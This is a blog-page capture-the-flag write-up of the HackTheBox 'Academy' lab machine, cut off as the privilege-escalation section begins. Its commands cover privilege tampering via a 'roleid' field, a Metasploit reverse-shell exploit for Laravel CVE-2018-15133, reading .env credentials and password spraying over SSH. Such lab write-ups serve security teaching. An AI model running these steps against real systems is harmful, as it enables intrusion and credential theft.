<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faf7d66d0-6402-4a6f-b9f5-00d2eb9e3482%2Fhackerman.gif?table=collection&amp;id=92e319e1-0c5e-49c7-adc1-7d48fe74e022">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>Academy - HackTheBox Writeup (10.10.10.215)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="Academy - HackTheBox Writeup (10.10.10.215)">
  
    <meta name="description" content="Easy-difficulty Linux box about exploiting Laravel CVE-2018-15133 and privilege escalation with Composer.">
    <meta property="og:description" content="Easy-difficulty Linux box about exploiting Laravel CVE-2018-15133 and privilege escalation with Composer.">
  
  
    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/10c8da0b46f53c882da946668dcdab95.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faf7d66d0-6402-4a6f-b9f5-00d2eb9e3482%2Fhackerman.gif?table=collection&amp;id=92e319e1-0c5e-49c7-adc1-7d48fe74e022"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/10c8da0b46f53c882da946668dcdab95.png"></span>
      </div>
    
    <h1 class="Header__Title">Academy - HackTheBox Writeup (10.10.10.215)</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Wed, Mar 3, 2021</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
            <a href="tag/Easy">Easy</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
            <a href="tag/Linux">Linux</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/Web_Application">Web Application</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/Laravel">Laravel</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--default">
            <a href="tag/Composer">Composer</a>
          </span>
        
      </div>
      <div>
        Easy-difficulty Linux box about exploiting Laravel CVE-2018-15133 and privilege escalation with Composer.
      </div>
    
  </header>
  <article id="https://www.notion.so/493907f2acdb409390aeee701db0c4b2" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/26988544a3854b69afee43b81007b4c4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/26988544a3854b69afee43b81007b4c4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/5947c0a8c2ee402d998bae8d611a2bd4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/535cfc2f736a43eabd6c1f3dce79bfd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.215 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/b31ba9610e0f4484827f9074c86a6c52" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx</span></span></span></code></pre></li><li id="https://www.notion.so/ec0d14f3d5594bad856cb14c4bfb8565" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/24b0eec7eca14cde992a014a0df5230a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80,33060 10.10.10.215 &gt; scan.nmap</code></span></span></p></div><pre id="https://www.notion.so/a047e0da167d43d6ba5c3eea04773c5d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message&quot;
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=12/13%Time=5FD5A260%P=x86_64-unknown-linux-g
SF:nu%r(NULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\
SF:0\x0b\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(
SF:HTTPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0
SF:\0\x0b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(D
SF:NSVersionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusReques
SF:tTCP,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1
SF:a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x
SF:1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServer
SF:Cookie,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0
SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20mes
SF:sage\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBPro
SF:gNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\
SF:x05HY000&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDS
SF:tring,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\
SF:x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20mess
SF:age\&quot;\x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPO
SF:ptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b
SF:\x08\x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(N
SF:CP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x0
SF:5HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x
SF:05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a
SF:\0&quot;)%r(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\
SF:x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20mess
SF:age\&quot;\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></span></code></pre><div id="https://www.notion.so/801b471ddf064125907393c6f5827572" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Apache httpd 2.4.41, </span></span></p></div></li></ul><h2 id="https://www.notion.so/822feafec5554b7b8828854de7342585" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/822feafec5554b7b8828854de7342585"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><div id="https://www.notion.so/08343259e75144949d22f8ddf12f7401" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTP Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/0bf2c27a754f43f096b5bfa752bea482" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In our targeted Nmap scan, port 80 reveals the virtual hostname as </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://academy.htb">http://academy.htb</a></span><span class="SemanticString">, so let&#x27;s add </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">10.10.10.215 academy.htb</code></span><span class="SemanticString"> to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/30b15cff2cb24fee8e4f2d1bf3fb956c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Website is an &quot;academy&quot; platform for HackTheBox, and seems to be a mirror of the real website at </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://academy.hackthebox.eu/">https://academy.hackthebox.eu/</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/a539de06a3364ab6ba4201626322f7ac" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Brute force directories with OWASP DirBuster and found an admin panel:</span></span><div id="https://www.notion.so/6d4bd3bdb26e4bb69d336aaf500515bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/academy/public/admin.php</code></span></span></p></div></li><li id="https://www.notion.so/5f173cec7937401fa408628de39bc831" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The admin panel contains a register function, let&#x27;s send a request and intercept it with Burp Suite, then forward the request to the repeater to have a deeper look.</span></span></li><li id="https://www.notion.so/6222987b3b2646d1970edee4e45e77ff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Register POST request has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roleid</code></span><span class="SemanticString"> field, which we can change to a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">1</code></span><span class="SemanticString"> to register as an admin:</span></span><div id="https://www.notion.so/7baa9d57d2d644ac858b7f2021024b18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">uid=samiko&amp;password=samiko&amp;confirm=samiko&amp;roleid=1</code></span></span></p></div></li><li id="https://www.notion.so/74f0e7fc2cdd4acea7a6db4fd4e64df2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Login using the newly created admin account:</span></span><div id="https://www.notion.so/db7a21ef5c6a45f2b0187fce2802a3cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">samiko:samiko</code></span></span></p></div></li><li id="https://www.notion.so/13262b4a18a842738c7a1ee4df2ea055" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upon entering the admin panel, we see a list of pending or completed jobs regarding the deployment of the academy website:</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/926fcdd525f54c2db036ef41c6863572" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Pending job: &quot;Fix issue with dev-staging-01.academy.htb&quot;</span></span></li><li id="https://www.notion.so/739dea566e0f41289bc2dc8398b9decf" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Done job: &quot;Complete initial set of modules (cry0l1t3 / mrb3n)&quot;</span></span></li></ol></li><li id="https://www.notion.so/c8393e91b1484f0d921b7da4f3547ebe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found possible usernames:</span></span><div id="https://www.notion.so/1088727115114fa78e6af52ebb62099b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">cry0l1t3, mrb3n</span></span></p></div></li><li id="https://www.notion.so/c24b08d5a5ec4e4785683b7828adb554" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigating to the staging server and we start to get redirect errors again. Append </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev-staging-01.academy.htb</code></span><span class="SemanticString"> to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString"> under the same IP entry.</span></span></li><li id="https://www.notion.so/51e62478234f45d0a4e3999be96b16c6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Environmental variables are exposed on the staging server, found possibly hidden database credentials:</span></span><pre id="https://www.notion.so/e4e5e2964bd0445885d58a198dea5754" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token constant">DB_HOST</span>       <span class="token string">"127.0.0.1"</span>
<span class="token constant">DB_PORT</span>	      <span class="token string">"3306"</span>
<span class="token constant">DB_DATABASE</span>	  <span class="token string">"homestead"</span>
<span class="token constant">DB_USERNAME</span>	  <span class="token string">"homestead"</span>
<span class="token constant">DB_PASSWORD</span>	  <span class="token string">"secret"</span></span></span></span></code></pre></li><li id="https://www.notion.so/0c6d63b8586248f4b8000788a75ae773" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found application name and key:</span></span><pre id="https://www.notion.so/02a58c44819e4ecab067400c21f6ab76" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token constant">APP_NAME</span>	    <span class="token string">"Laravel"</span>
<span class="token constant">APP_ENV</span>	      <span class="token string">"local"</span>
<span class="token constant">APP_KEY</span>	      <span class="token string">"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="</span></span></span></span></code></pre></li><li id="https://www.notion.so/bb28e63990604541abe6639edd89339a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We discover that the host is running on Laravel PHP framework, and the application key seems to be exposed for some reason.</span></span></li></ul><h2 id="https://www.notion.so/97db6097b46c4d4db48ecca29a96f1f0" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/97db6097b46c4d4db48ecca29a96f1f0"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/4c2e91f3615c4b6a948ed92cae0b8c76" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Laravel 5.5.40/5.6.x-5.6.29 is vulnerable to an RCE attack under CVE-2018-15133, which is caused by an insecure deserialisation call on an untrusted </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">X-XSRF-TOKEN</code></span><span class="SemanticString"> value.</span></span></li><li id="https://www.notion.so/6cdb406a77e54b86a00d722430129481" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This exploit is possible if the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">APP_KEY</code></span><span class="SemanticString"> is known or exposed from a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.env</code></span><span class="SemanticString"> file disclosure, which we have discovered earlier on the staging server.</span></span></li><li id="https://www.notion.so/36110e7b157c41679a3fdda17b386f81" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using Metasploit, let&#x27;s look for an existing exploit:</span></span><div id="https://www.notion.so/ae9ec8ede0f24d0083b788ce6c48433e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ msfconsole</code></span></span></p></div><div id="https://www.notion.so/63e0ec3469244ec7988b55be654628a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; search laravel</code></span></span></p></div><pre id="https://www.notion.so/18fbc051702745f28d8c087a7d9a5663" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution</span></span></span></code></pre><div id="https://www.notion.so/51b238540d33422fb70983faedf72aff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; use 0</code></span></span></p></div></li><li id="https://www.notion.so/19d2e9e93187408cb6fd3c9e284afc94" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using options:</span></span><div id="https://www.notion.so/b2ceb5ce1db94af3816f91d353ff3331" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set RHOST 10.10.10.215</code></span></span></p></div><div id="https://www.notion.so/29692142f0f64d0b93b10138ef3e723a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set VHOST dev-staging-01.academy.htb</code></span></span></p></div><div id="https://www.notion.so/0fa07533fe574b9b889e3dadb5e5e058" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; set LHOST 10.10.14.53</code></span></span></p></div></li><li id="https://www.notion.so/aec6afea1320490f93f0d856c894f705" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After running the exploit, we should get a shell as www-data:</span></span><div id="https://www.notion.so/afc5992afb9a4c2186dbc419b461bd2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; run</code></span></span></p></div><div id="https://www.notion.so/314d3d56ee8647a4b69a09bf2beac22b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls -la /home/</code></span></span></p></div><pre id="https://www.notion.so/989f3b0272a94ce9bcd374f6fa6d2641" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10 00:34 21y4d
drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10 00:34 ch4p
drwxr-xr-x  6 cry0l1t3 cry0l1t3 4096 Dec 13 22:55 cry0l1t3
drwxr-xr-x  3 egre55   egre55   4096 Aug 10 23:41 egre55
drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10 00:34 g0blin
drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12 22:19 mrb3n</span></span></span></code></pre></li><li id="https://www.notion.so/4809ca041eb84e708977f476e09f5202" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get usernames and save them to a file:</span></span><div id="https://www.notion.so/30718deef4e24ee9a97bc141d3d2a246" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;21y4d ch4p cry0l1t3 egre55 g0blin mrb3n&quot; | tr -s &#x27; &#x27; &#x27;\n&#x27; &gt; usernames.txt</code></span></span></p></div></li><li id="https://www.notion.so/91f3ac05fd4b48a9a41f0b80a41d0e56" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Out of all other users, cry0l1t3 has the latest modification date. We find a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">linpeas.sh</code></span><span class="SemanticString"> script (which was not placed by other users) and the user flag:</span></span><pre id="https://www.notion.so/54aa9df0467140ad94d757d95f3a1c08" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>-rwxrwxr-x 1 cry0l1t3 cry0l1t3 297851 Nov 24 18:44 linpeas.sh
-r--r----- 1 cry0l1t3 cry0l1t3     33 Dec 13 21:38 user.txt</span></span></span></code></pre></li><li id="https://www.notion.so/c43f7a08f0a74829b1ab4160ab58a3bf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We find the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.env</code></span><span class="SemanticString"> file exposed on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev-staging-01.academy.htb</code></span><span class="SemanticString"> earlier, and this time the database password is not censored:</span></span><div id="https://www.notion.so/08a7e11f384d4ac2b5c38a581df077e1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat /var/www/html/academy/.env</code></span></span></p></div><pre id="https://www.notion.so/7466f0fb38fd4674bd7ccf75b46f2c30" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!</span></span></span></code></pre></li><li id="https://www.notion.so/f9cd2a3da541491c90a37a00bb61a1f1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found password </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mySup3rP4s5w0rd!!</code></span><span class="SemanticString">, checking if a user reused it for their SSH credentials:</span></span><div id="https://www.notion.so/f71affe1296a4c74862ecd5233c03d9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ crackmapexec ssh 10.10.10.215 -u ./usernames.txt -p &#x27;mySup3rP4s5w0rd!!&#x27;</code></span></span></p></div><pre id="https://www.notion.so/e729ca997d4d45e5abfea5db5ac92eb2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>SSH         10.10.10.215    22     10.10.10.215     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
SSH         10.10.10.215    22     10.10.10.215     [-] 21y4d:mySup3rP4s5w0rd!! Authentication failed.
SSH         10.10.10.215    22     10.10.10.215     [-] ch4p:mySup3rP4s5w0rd!! Authentication failed.
SSH         10.10.10.215    22     10.10.10.215     [+] cry0l1t3:mySup3rP4s5w0rd!!</span></span></span></code></pre></li><li id="https://www.notion.so/c862dbae58904ff698cacff201925136" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found SSH credentials:</span></span><div id="https://www.notion.so/2bef1a09ac2a45cc95325d01234564dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cry0l1t3:mySup3rP4s5w0rd!!</code></span></span></p></div></li><li id="https://www.notion.so/20905aa7f7354bafa5963d22f8061428" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">SSH in as cry0l1t3:</span></span><div id="https://www.notion.so/65d2148032e24e17a45fc41bb7faa938" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh cry0l1t3@10.10.10.215</code></span></span></p></div></li><li id="https://www.notion.so/fcfac3b647dc45f695a70daba12a6a5f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/f28c1c0e608e4f238e824a20e29d125a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/f28c1c0e608e4f238e824a20e29d125a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 